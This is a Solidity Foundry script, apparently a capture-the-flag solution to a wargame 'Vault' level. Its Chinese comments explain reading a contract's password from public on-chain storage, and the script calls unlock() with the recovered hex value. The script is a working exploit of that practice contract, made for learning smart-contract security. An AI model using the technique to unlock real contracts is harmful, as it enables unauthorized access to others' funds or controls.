// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 取得合約的 password 
// 此合約的問題, 因為區塊鏈上的資訊都是透明公開, 所以不能在區塊鏈上儲存密碼
// 兩個解法
// 1.透過 etherscan 去找合約的密碼
// 2.透過 cast storage 合約地址取得密碼
// 再透過 https://codebeautify.org/hex-string-converter 去破解 hex 

contract Lev7Sol is Script {
    Vault public lev8Instance = Vault(payable(0x7396Ff5F5Ce3C89a825F34Af0d9991BaA6342bCf));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // 已經先透過 cast storage 取得合約密碼, 這裡只是呼叫合約的 unlock 代入密碼
        lev8Instance.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        vm.stopBroadcast();
    }
}
